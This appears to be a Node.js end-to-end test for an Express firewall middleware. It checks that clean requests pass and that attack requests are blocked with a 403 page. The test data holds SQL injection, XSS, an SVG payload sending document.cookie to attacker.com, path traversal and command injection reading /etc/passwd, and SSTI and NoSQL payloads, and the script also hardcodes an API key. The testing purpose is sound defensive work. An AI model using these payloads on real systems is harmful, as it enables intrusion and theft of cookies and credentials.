'use strict';

const express = require('express');
const http = require('http');
const mdefender = require('./index.js');

const PORT = 4055;
const API_KEY = 'OQ7hd6JZIAGgtfd5SkuaVT8UHhsGudJF0k2yToygelRo5KSgDVu1qOqq1hdcP8Tp';
const API_ENDPOINT = 'http://127.0.0.1:8000';

async function runE2ETests() {
  console.log('====================================================================');
  console.log('      MDEFENDER-PRO NPM PACKAGE END-TO-END SECURITY AUDIT          ');
  console.log('====================================================================\n');

  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Attach MDefender Middleware
  app.use(mdefender({
    apiKey: API_KEY,
    domain: 'localhost',
    apiEndpoint: API_ENDPOINT,
    mode: 'block',
    timeout: 3000,
    logBlocked: false // suppress verbose logs during batch test
  }));

  // Application Routes
  app.get('/', (req, res) => res.json({ status: 'ok', message: 'Welcome to Protected API' }));
  app.get('/api/products', (req, res) => res.json({ items: [{ id: 1, name: 'Secure Item' }] }));
  app.post('/api/feedback', (req, res) => res.json({ status: 'success', received: req.body }));

  const server = await new Promise((resolve) => {
    const s = app.listen(PORT, '127.0.0.1', () => resolve(s));
  });

  console.log(`[+] Express Test Server listening on http://127.0.0.1:${PORT}`);
  console.log(`[+] Connected to MDefender Cloud AI Backend at ${API_ENDPOINT}\n`);

  function makeRequest({ method = 'GET', path = '/', body = null, headers = {} }) {
    return new Promise((resolve, reject) => {
      const startTime = process.hrtime();
      const postData = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
      
      const reqHeaders = { ...headers };
      if (postData) {
        reqHeaders['Content-Type'] = reqHeaders['Content-Type'] || 'application/json';
        reqHeaders['Content-Length'] = Buffer.byteLength(postData);
      }

      const req = http.request({
        hostname: '127.0.0.1',
        port: PORT,
        path,
        method,
        headers: reqHeaders,
        timeout: 5000
      }, (res) => {
        let resBody = '';
        res.setEncoding('utf8');
        res.on('data', chunk => { resBody += chunk; });
        res.on('end', () => {
          const diff = process.hrtime(startTime);
          const durationMs = (diff[0] * 1000 + diff[1] / 1e6).toFixed(2);
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: resBody,
            durationMs: parseFloat(durationMs)
          });
        });
      });

      req.on('error', reject);
      if (postData) req.write(postData);
      req.end();
    });
  }

  const testResults = [];

  async function testCase(name, requestOptions, expectedStatus, isAttack = false) {
    process.stdout.write(`[*] Testing: ${name.padEnd(45)} ... `);
    try {
      const res = await makeRequest(requestOptions);
      const passedStatus = res.statusCode === expectedStatus;
      let extraPassed = true;
      let failReason = '';

      if (isAttack) {
        // Verify block page elements
        const hasBlockTitle = res.body.includes('403 Forbidden') || res.body.includes('Access Denied');
        const hasLogo = res.body.includes('MDEFENDER-PRO AI') || res.body.includes('cfShieldGrad');
        const hasWhatHappened = res.body.includes('What happened?');
        const hasRefId = res.headers['x-mdefender-ref'] || res.body.includes('Reference ID');
        
        if (!hasBlockTitle) {
          extraPassed = false;
          failReason = 'Block page missing 403 Forbidden title';
        } else if (!hasLogo) {
          extraPassed = false;
          failReason = 'Block page missing MDefender Logo header';
        }
      } else {
        // Verify clean JSON response
        try {
          JSON.parse(res.body);
        } catch (e) {
          extraPassed = false;
          failReason = 'Clean request did not return valid JSON payload';
        }
      }

      if (passedStatus && extraPassed) {
        console.log(`[PASS] (${res.statusCode} in ${res.durationMs}ms)`);
        testResults.push({ name, status: 'PASS', code: res.statusCode, time: res.durationMs });
      } else {
        console.log(`[FAIL] (Got ${res.statusCode}, expected ${expectedStatus} - ${failReason})`);
        testResults.push({ name, status: 'FAIL', code: res.statusCode, time: res.durationMs, error: failReason });
      }
    } catch (err) {
      console.log(`[ERROR] (${err.message})`);
      testResults.push({ name, status: 'ERROR', error: err.message });
    }
  }

  // 1. Legitimate (Clean) Traffic Tests (Normal Visitors)
  console.log('--- 1. CLEAN LEGITIMATE TRAFFIC INSPECTION (NORMAL VISITORS) ---');
  await testCase('Clean GET Request to Root (/)', { method: 'GET', path: '/', headers: { 'X-Forwarded-For': '198.51.100.10' } }, 200, false);
  await testCase('Clean GET Request to API (/api/products)', { method: 'GET', path: '/api/products', headers: { 'X-Forwarded-For': '198.51.100.11' } }, 200, false);
  await testCase('Clean POST JSON Request (/api/feedback)', { method: 'POST', path: '/api/feedback', body: { message: 'Hello this is normal user feedback' }, headers: { 'X-Forwarded-For': '198.51.100.12' } }, 200, false);

  // 2. OWASP Top 10 Threat Vectors (Malicious Attackers)
  console.log('\n--- 2. ATTACK VECTOR DETECTION & 403 BLOCK PAGE AUDIT (ATTACKERS) ---');
  await testCase('SQL Injection (URL Query param)', { method: 'GET', path: '/api/products?id=1%27%20OR%201=1--', headers: { 'X-Forwarded-For': '203.0.113.1' } }, 403, true);
  await testCase('SQL Injection (UNION SELECT in POST body)', { method: 'POST', path: '/api/feedback', body: { user: 'admin', comment: "' UNION SELECT 1,username,password FROM users--" }, headers: { 'X-Forwarded-For': '203.0.113.2' } }, 403, true);
  await testCase('Cross-Site Scripting (XSS in Query)', { method: 'GET', path: '/?search=%3Cscript%3Ealert(%27xss%27)%3C/script%3E', headers: { 'X-Forwarded-For': '203.0.113.3' } }, 403, true);
  await testCase('Cross-Site Scripting (SVG Onload in POST)', { method: 'POST', path: '/api/feedback', body: { note: '<svg onload=fetch("http://attacker.com/steal?cookie="+document.cookie)>' }, headers: { 'X-Forwarded-For': '203.0.113.4' } }, 403, true);
  await testCase('Path Traversal / LFI (/etc/passwd)', { method: 'GET', path: '/download?file=../../../../../../etc/passwd', headers: { 'X-Forwarded-For': '203.0.113.5' } }, 403, true);
  await testCase('Remote Code Execution (Command Injection)', { method: 'POST', path: '/api/feedback', body: { cmd: '; cat /etc/passwd && id' }, headers: { 'X-Forwarded-For': '203.0.113.6' } }, 403, true);
  await testCase('Server-Side Template Injection (SSTI)', { method: 'POST', path: '/api/feedback', body: { template: '{{7*7}} ${7*7} {{config.items()}}' }, headers: { 'X-Forwarded-For': '203.0.113.7' } }, 403, true);
  await testCase('NoSQL Injection ($ne query operator)', { method: 'POST', path: '/api/feedback', body: { username: 'admin', password: { '$ne': '' } }, headers: { 'X-Forwarded-For': '203.0.113.8' } }, 403, true);

  // 3. DDoS / Rapid Burst Flood Mitigation
  console.log('\n--- 3. DDOS BURST FLOOD MITIGATION TEST ---');
  process.stdout.write('[*] Simulating Rapid Burst Flood (25 concurrent requests from 203.0.113.99) ... ');
  const burstPromises = Array.from({ length: 25 }).map((_, i) => 
    makeRequest({ method: 'GET', path: `/api/products?burst_seq=${i}`, headers: { 'X-Forwarded-For': '203.0.113.99' } })
  );
  const burstResponses = await Promise.all(burstPromises);
  const blockedInBurst = burstResponses.filter(r => r.statusCode === 403 || r.statusCode === 429).length;
  const allowedInBurst = burstResponses.filter(r => r.statusCode === 200).length;
  console.log(`[DONE] (Handled 25 requests: ${allowedInBurst} Allowed, ${blockedInBurst} Mitigated)`);

  // Close test server
  server.close();

  // Summary
  const passedCount = testResults.filter(r => r.status === 'PASS').length;
  const totalCount = testResults.length;
  const passRate = ((passedCount / totalCount) * 100).toFixed(1);

  console.log('\n====================================================================');
  console.log(`AUDIT SUMMARY: TOTAL: ${totalCount} | PASSED: ${passedCount} | FAILED: ${totalCount - passedCount} | PASS RATE: ${passRate}%`);
  console.log('====================================================================');
}

runE2ETests().catch(console.error);
